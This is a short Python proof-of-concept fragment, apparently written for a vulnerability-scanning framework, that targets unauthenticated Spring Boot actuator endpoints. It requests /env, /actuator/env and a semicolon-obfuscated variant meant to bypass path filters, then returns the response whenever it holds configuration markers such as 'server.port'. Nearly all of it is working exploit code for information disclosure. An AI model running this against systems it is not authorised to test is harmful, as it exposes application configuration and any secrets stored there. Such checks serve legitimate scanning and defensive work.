...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth gateway Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/env","/actuator/env","/actuator;/env;"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if "applicationConfig" in res.text and "activeProfiles" in res.text and "server.port" in res.text:
                return res.text
